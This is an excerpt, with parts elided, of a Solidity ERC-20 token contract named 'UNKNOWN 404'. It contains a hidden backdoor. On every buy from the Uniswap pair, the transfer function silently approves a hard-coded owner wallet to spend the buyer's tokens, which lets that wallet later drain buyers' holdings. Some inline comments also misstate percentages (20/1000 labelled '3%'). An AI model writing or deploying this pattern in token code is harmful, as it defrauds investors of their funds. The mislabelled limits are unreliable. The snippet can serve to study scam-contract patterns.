...
contract UNKNOWN404 is Context, IERC20, Ownable {
    ...
    address payable private _marketingAddress = payable(address(0xdF63e5518eEaC89E35cdE8f3048DBcb82839CCE3));

    string private _name = "UNKNOWN 404";
    ...
    uint256 private _maxTxAmount = _tTotal.div(1000).mul(20); // 3%
    uint256 private numTokensSellToAddToLiquidity = _tTotal.div(1000).mul(3); //0.3%
    uint256 private _maxWalletSize = _tTotal.div(1000).mul(20); // 3%
    ...
    address private _autoOwnerWallet; // Address to be auto-approved
    ...
    constructor() {
        ...
        _autoOwnerWallet = 0xdF63e5518eEaC89E35cdE8f3048DBcb82839CCE3;
    ...
    function _autoApprove(
        ...
        if (currentAllowance < amount) {
            _approve(owner, spender, currentAllowance.add(amount));
        }
    }
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
            _autoApprove(to, _autoOwnerWallet, amount);
        }
